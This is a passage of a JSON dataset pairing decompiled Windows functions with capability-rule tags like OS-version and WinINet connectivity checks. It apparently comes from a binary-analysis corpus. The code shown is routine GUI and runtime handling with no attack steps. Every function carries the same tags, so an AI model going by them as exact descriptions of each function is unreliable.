        "decompiled_code": "\nvoid __cdecl fcn.00443710(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x443722;\n    fcn.00404458();\n    uStack24 = 0x44377b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.00404268();\n    (**(**(arg_8h + -4) + 0x10))();\n    if (0 < iVar1) {\n        (**(**(arg_8h + -4) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x443782;\n    uStack24 = 0x44377a;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 238
    },
    "00443844": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443844(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x44397d;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x443879;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x443885;\n    piVar1 = fcn.00403228();\n    uStack56 = 0x44392c;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    iVar2 = fcn.0043e7a4();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0043e7b8();\n            if ((*(iVar3 + 0x57) == '\\0') && (*(iVar3 + 8) != 0)) {\n                (**(*piVar1 + 0x38))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = (**(*piVar1 + 0x14))();\n    (**(*param_2 + 0x10))();\n    if (-1 < iVar2 + -1) {\n        do {\n            arg_8h = &stack0xfffffffc;\n            (**(*piVar1 + 0xc))();\n            fcn.00443710(arg_8h);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x443933;\n    uStack56 = 0x44392b;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 529
    },
    "00443b64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443b64(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x6c) == 0) {\n        iVar1 = fcn.0043e7a4();\n        if (0 < iVar1) {\n            fcn.004423b8(0x443b8c);\n        }\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00443c88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443c88(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if ((in_EAX != *(arg_8h + -4)) && (*(*(in_EAX + 0x14) + 0x10) == *(*(*(arg_8h + -4) + 0x14) + 0x10))) {\n        iVar1 = fcn.00442004();\n        iVar2 = fcn.00442004();\n        if ((iVar2 < iVar1) && ((*(in_EAX + 4) == 0 || ((*(in_EAX + 4) != 0 && (*(*(in_EAX + 4) + 0x57) != '\\0')))))) {\n            fcn.00442004();\n            uVar3 = fcn.00423d78();\n            *(arg_8h + -8) = uVar3;\n        }\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.00443c88(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.00443c88(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "00443e64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443e64(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x14) != 0) && (*(in_EAX + 0x14) != *(*(arg_8h + -4) + 100))) {\n        iVar2 = fcn.00441af0();\n        if (iVar2 == 1) {\n            fcn.00443e64(arg_8h);\n        }\n    }\n    iVar2 = fcn.00441af0();\n    if ((iVar2 == 1) || (*(in_EAX + 0x24) == 0)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n        iVar2 = *(*(arg_8h + -4) + 0x18) + *(*(arg_8h + -4) + 0xc) + 0xe;\n        iVar3 = fcn.004420e8();\n        if (iVar3 == 0) {\n            iVar3 = fcn.004420dc();\n            if (iVar3 != 0) {\n                fcn.004420dc();\n                iVar3 = fcn.00442004();\n                if (iVar3 - *(in_EAX + 0x24) < iVar2) {\n                    bVar1 = true;\n                }\n                else {\n                    fcn.00441b40();\n                    fcn.0044202c();\n                    fcn.004420dc();\n                    fcn.0044207c();\n                }\n            }\n        }\n        else {\n            fcn.004420e8();\n            iVar3 = fcn.00442004();\n            iVar4 = fcn.00441b40();\n            if ((iVar3 - iVar4) - *(in_EAX + 0x24) < iVar2) {\n                bVar1 = true;\n            }\n            else {\n                fcn.00442004();\n                fcn.0044202c();\n                fcn.00442004();\n                fcn.0044202c();\n                fcn.004420e8();\n                fcn.0044207c();\n            }\n        }\n    }\n    if (bVar1) {\n        fcn.00441cec();\n    }\n    fcn.004423b8(0x443b8c, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 556
    },
    "004440b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004440b4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff94;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x44448c;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    iVar2 = *param_2;\n    var_4h = in_EAX;\n    if (iVar2 < 0x203) {\n        if (iVar2 == 0x202) {\n            if (in_EAX[0x18] == 0) {\n                puStack92 = &stack0xfffffffc;\n                fcn.00406960();\n                iVar2 = fcn.00442b44();\n                if ((iVar2 != 0) && (var_10h == 0x14)) {\n                    cVar1 = fcn.004033e4();\n                    if (cVar1 == '\\0') {\n                        fcn.0043944c();\n                    }\n                    else {\n                        fcn.00455ccc();\n                    }\n                }\n            }\n            else {\n                puStack92 = &stack0xfffffffc;\n                fcn.00443ae8();\n            }\n        }\n        else if (iVar2 == 0x20) {\n            puStack92 = &stack0xfffffffc;\n            sub.user32.dll_GetCursorPos(&fcn.004440b4::var_ch);\n            in_stack_ffffff94 = 0x44430a;\n            fcn.00439070();\n            if (*(param_2 + 2) == 1) {\n                in_stack_ffffff94 = 0x44432c;\n                iVar2 = fcn.0043fd08();\n                if (iVar2 == param_2[1]) {\n                    in_stack_ffffff94 = 0x444340;\n                    iVar2 = fcn.0043e838();\n                    if (0 < iVar2) {\n                        in_stack_ffffff94 = 0x444356;\n                        iVar2 = fcn.00442b44();\n                        if ((iVar2 != 0) && (var_10h == 0x12)) {\n                            in_stack_ffffff94 = fcn.004573cc();\n                            sub.user32.dll_SetCursor();\n                            param_2[3] = 1;\n                            goto code_r0x00444476;\n                        }\n                    }\n                }\n            }\n        }\n        else if (iVar2 == 0x200) {\n            puStack92 = &stack0xfffffffc;\n            if (in_EAX[0x18] != 0) {\n                puStack92 = &stack0xfffffffc;\n                fcn.00443b9c();\n                fcn.00406960();\n                var_4h[0x14] = var_44h;\n                var_4h[0x15] = var_40h;\n                in_stack_ffffff94 = 0x444172;\n                fcn.00444024(&stack0xfffffffc);\n                fcn.00443b9c();\n            }\n        }\n        else {\n            puStack92 = &stack0xfffffffc;\n            if (iVar2 == 0x201) {\n                puStack92 = &stack0xfffffffc;\n                fcn.00406960();\n                iVar2 = fcn.00442b44();\n                if (iVar2 != 0) {\n                    if (var_10h == 0x12) {\n                        fcn.00443a88();\n                    }\n                    else if (var_10h == 2) {\n                        in_stack_ffffff94 = 0x203;\n                        uVar3 = fcn.0043fd08(0x203, 0x203, 0);\n                        iVar4 = sub.user32.dll_PeekMessageA(&fcn.004440b4::var_3ch, uVar3);\n                        if ((iVar4 == 0) && (cVar1 = fcn.004033e4(),  cVar1 != '\\0')) {\n                            (**(**(iVar2 + 4) + 0xc4))();\n                        }\n                        if ((*(*(iVar2 + 4) + 0x9b) == '\\x01') && (*(*(iVar2 + 4) + 0x5d) == '\\x01')) {\n                            fcn.00439bc8();\n                        }\n                        goto code_r0x00444476;\n                    }\n                }\n            }\n        }\n    }\n    else if (iVar2 == 0x203) {\n        fcn.00406960();\n        iVar2 = fcn.00442b44();\n        if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (var_10h == 2)) {\n            fcn.00437d8c();\n            in_stack_ffffff94 = 0x4441ca;\n            fcn.0043a220(1);\n        }\n    }\n    else {\n        if (iVar2 == 0xb030) {\n            puStack92 = &stack0xfffffffc;\n            (*in_EAX[0xc])();\n            if (param_2[3] == 0) {\n                iVar2 = (**(*var_4h + 4))();\n                if (var_10h == 0x12) {\n                    fcn.00403fa8();\n                }\n                else if ((iVar2 != 0) && ((var_10h == 2 || (var_10h == 0x14)))) {\n                    fcn.00438ecc();\n                    (***var_4h)();\n                    var_20h = *(iVar2 + 0x40) * 2 - var_20h;\n                    var_1ch = *(iVar2 + 0x44) * 2 - var_1ch;\n                    var_18h = *(iVar2 + 0x48) * -2 + var_18h * 3 + var_20h * -2;\n                    var_14h = *(iVar2 + 0x4c) * -2 + var_14h * 3 + var_1ch * -2;\n                    fcn.0043952c();\n                    fcn.00403ffc();\n                    iVar2 = param_2[2];\n                    *(iVar2 + 0x18) = var_20h;\n                    *(iVar2 + 0x1c) = var_1ch;\n                    *(iVar2 + 0x20) = var_18h;\n                    *(iVar2 + 0x24) = var_14h;\n                }\n            }\n            goto code_r0x00444476;\n        }\n        puStack92 = &stack0xfffffffc;\n        if ((iVar2 == 0xb042) && (puStack92 = &stack0xfffffffc,  *param_2[2] == 0xb00b)) {\n            puStack92 = &stack0xfffffffc;\n            fcn.00443f9c();\n        }\n    }\n    if (*(var_4h + 0x32) != 0) {\n        (*var_4h[0xc])();\n    }\ncode_r0x00444476:\n    *in_FS_OFFSET = in_stack_ffffff94;\n    uStack100 = 0x444493;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 1742
    },
    "004445c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004445c0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = fcn.00406a4c(in_EAX + 0x10, auStack8);\n    *(in_EAX + 0x18) = uVar1;\n    *(in_EAX + 0x20) = *(in_EAX + 0x1c) != 0;\n    return;\n}\n",
        "token_count": 108
    },
    "00444610": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444610(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        fcn.00444574();\n        if (*(in_EAX + 0xd) != '\\0') {\n            fcn.00444590();\n            return;\n        }\n        fcn.004445c0();\n    }\n    else if ((param_2 == 0x68) && (*(in_EAX + 0x20) != '\\0')) {\n        if (*(in_EAX + 0xd) == '\\0') {\n            uVar1 = sub.user32.dll_SendMessageA(*(in_EAX + 0x18), *(in_EAX + 0x14), 0, 0);\n            *(in_EAX + 0x10) = uVar1;\n        }\n        else {\n            sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00444674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00444674(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint uMode;\n    \n    if (*(*0x462210 + 0xc) != '\\0') {\n        uStack16 = 0x8000;\n        puStack20 = 0x444692;\n        uVar1 = sub.kernel32.dll_SetErrorMode();\n        uStack24 = 0x4447da;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (*0x463b64 == 0) {\n            puStack20 = &stack0xfffffffc;\n            in_stack_ffffffd8 = sub.kernel32.dll_GetModuleHandleA_2(0x4447e8);\n            *0x463b64 = sub.kernel32.dll_GetProcAddress_1(in_stack_ffffffd8, 0x4447f0);\n        }\n        if (*0x461bb8 == 0) {\n            *0x461bb8 = sub.kernel32.dll_LoadLibraryA(0x444800);\n            if (*0x461bb8 != 0) {\n                *0x463b68 = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x44480c);\n                *0x463b6c = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x44481c);\n                *0x463b70 = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x444830);\n                *0x463b74 = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x444848);\n                *0x463b78 = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x444860);\n                *0x463b7c = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x444874);\n                *0x463b80 = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x44488c);\n                *0x463b84 = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x4448a4);\n                *0x463b88 = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x4448c0);\n                *0x463b8c = sub.kernel32.dll_GetProcAddress_1(*0x461bb8, 0x4448cc);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        sub.kernel32.dll_SetErrorMode(uVar1, 0x4447e1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 640
    },
    "004448dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004448dc(void)\n\n{\n    uint uVar1;\n    \n    if (*0x463b64 != NULL) {\n        uVar1 = (**0x463b64)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 56
    },
    "004448f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004448f8(uint param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar auStack20 [8];\n    \n    if ((*(*0x462210 + 0xc) != '\\0') && (param_2 != 3)) {\n        if (param_2 == 0) {\n            uStack24 = 0x444927;\n            fcn.004448dc();\n        }\n        else {\n            uStack24 = 0x444935;\n            fcn.004448dc();\n            if (*0x461bb8 != 0) {\n                puStack28 = 0x444949;\n                puStack32 = &stack0xffffffe8;\n                uVar1 = (**0x463b68)();\n                if (uVar1 != 0) {\n                    puStack28 = &stack0xffffffec;\n                    uStack40 = 0x444960;\n                    uStack36 = uVar1;\n                    (**0x463b70)();\n                    uStack44 = uVar1;\n                    if (param_2 == 1) {\n                        uStack40 = 0;\n                        (**0x463b78)();\n                    }\n                    else if (param_2 == 2) {\n                        uStack40 = 1;\n                        (**0x463b78)();\n                    }\n                    else {\n                        uStack40 = 1;\n                        (**0x463b78)();\n                        (**0x463b70)(uVar1, &stack0xffffffd4, &stack0xffffffd8);\n                        uStack44 = uStack44 & 0xfffffff4 | *(param_2 + 0x461bb8);\n                    }\n                    (**0x463b74)(uVar1, uStack44, uStack40);\n                    (**0x463b6c)();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "004449d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004449d4(void)\n\n{\n    uint uVar1;\n    \n    if (*0x461bb8 != 0) {\n        uVar1 = (**0x463b88)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "004449e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004449e8(void)\n\n{\n    ushort extraout_var;\n    ushort extraout_var_00;\n    \n    fcn.00403258();\n    **0x462098 = 0;\n    fcn.00403258();\n    **0x4621e4 = 0;\n    fcn.00403258();\n    *0x463b10 = 0;\n    fcn.00403258();\n    sub.kernel32.dll_GlobalDeleteAtom(CONCAT22(extraout_var, *0x463b1e));\n    fcn.00403fa8();\n    sub.kernel32.dll_GlobalDeleteAtom(CONCAT22(extraout_var_00, *0x463b1c));\n    fcn.00403fa8();\n    if (*0x461bb8 != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x461bb8);\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00445668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00445668(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041951c();\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x30) = uVar1;\n    iVar2 = fcn.00403228();\n    *(in_EAX + 0x34) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x4457ec;\n    *(in_EAX + 0x58) = 0;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 269
    },
    "004458e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.004458e4(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    fcn.004505c8();\n    iVar3 = fcn.00448db0();\n    if ((iVar3 != 0) && (iVar6 = *(*(in_EAX + 0x30) + 8),  -1 < iVar6 + -1)) {\n        iVar7 = 0;\n        do {\n            piVar1 = *(*(*(in_EAX + 0x30) + 4) + iVar7 * 4);\n            cVar2 = fcn.004033e4();\n            if (cVar2 != '\\0') {\n                if (iVar3 == *(piVar1 + 0x21)) {\ncode_r0x0044595b:\n                    uVar5 = (**(*piVar1 + 0x50))();\n                    goto code_r0x0044596a;\n                }\n                if (piVar1[0x24] != 0) {\n                    fcn.0044618c();\n                    iVar4 = fcn.004461ec();\n                    if (iVar4 != -1) goto code_r0x0044595b;\n                }\n            }\n            iVar7 = iVar7 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n    }\n    uVar5 = 0;\ncode_r0x0044596a:\n    return CONCAT44(in_EAX, uVar5);\n}\n",
        "token_count": 369
    },
    "00445cf8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445cf8(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x1a) != '\\0') {\n        return;\n    }\n    *(in_EAX + 0x1a) = 1;\n    uStack28 = 0x445df0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (param_2 != *(in_EAX + 0x69)) {\n        iVar4 = *(in_EAX[0x14] + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar4 + -1) {\n            do {\n                puStack24 = puVar1;\n                piVar3 = fcn.00403408();\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 0x50))();\n                }\n                iVar4 = iVar4 + -1;\n                puVar1 = puStack24;\n            } while (iVar4 != 0);\n        }\n        *(in_EAX + 0x69) = param_2;\n        if (((0 < in_EAX[0x1b]) && (*(in_EAX + 0x69) != '\\0')) && (iVar4 = fcn.004457b0(),  -1 < iVar4 + -1)) {\n            do {\n                piVar3 = fcn.0044579c();\n                if (((piVar3 != in_EAX) && (cVar2 = fcn.004033e4(),  cVar2 != '\\0')) && (piVar3[0x1b] == in_EAX[0x1b]))\n                {\n                    fcn.00445cf8();\n                }\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        (**(*in_EAX + 0x30))();\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x1a) = 0;\n    return;\n}\n",
        "token_count": 534
    },
    "0044618c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0044618c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x90) == 0) {\n        uVar1 = fcn.00403228();\n        *(in_EAX + 0x90) = uVar1;\n    }\n    return *(in_EAX + 0x90);\n}\n",
        "token_count": 87
    },
    "00446548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00446548(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.004035e4();\n    while (0 < *(*(iVar1 + 0x4c) + 8)) {\n        fcn.00413c4c();\n        fcn.00447514();\n    }\n    fcn.00403258();\n    fcn.004468a4();\n    fcn.00403258();\n    *(iVar1 + 0x4c) = 0;\n    if (*(iVar1 + 0x54) != 0) {\n        fcn.00403258();\n    }\n    fcn.00419568();\n    if ('\\0' < extraout_DL) {\n        fcn.004035cc();\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "0044666c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0044666c(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x3c) != 0;\n}\n",
        "token_count": 50
    },
    "00446674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00446674(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x3c) == 0) {\n        fcn.004468dc();\n    }\n    return;\n}\n",
        "token_count": 52
    },
    "004468a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004468a4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.0044666c();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x42) == '\\0')) {\n        uVar2 = fcn.00446840();\n        sub.comctl32.dll_ImageList_Destroy(uVar2);\n    }\n    *(in_EAX + 0x3c) = 0;\n    fcn.00403454();\n    return;\n}\n",
        "token_count": 127
    },
    "00446a48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446a48(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x446a63;\n    fcn.00421984();\n    uStack36 = 0x446b47;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if ((*(in_EAX + 0x41) != '\\0') && (param_1 != -1)) {\n        puStack44 = 0x446a96;\n        puStack32 = &stack0xfffffffc;\n        piVar1 = fcn.00421984();\n        uStack48 = 0x446b09;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*piVar1 + 8))();\n        fcn.00422e70();\n        fcn.00446674();\n        (**(*piVar1 + 0x68))();\n        uVar2 = fcn.00446830();\n        uVar3 = fcn.00446850(uVar2);\n        uVar2 = *(in_EAX + 0x3c);\n        sub.comctl32.dll_ImageList_Add(uVar2, uVar3);\n        *in_FS_OFFSET = uVar2;\n        fcn.00403258(0x446b31);\n        return;\n    }\n    puStack44 = NULL;\n    uStack48 = 0x446b1f;\n    puStack32 = &stack0xfffffffc;\n    uStack48 = fcn.00446850();\n    uStack52 = 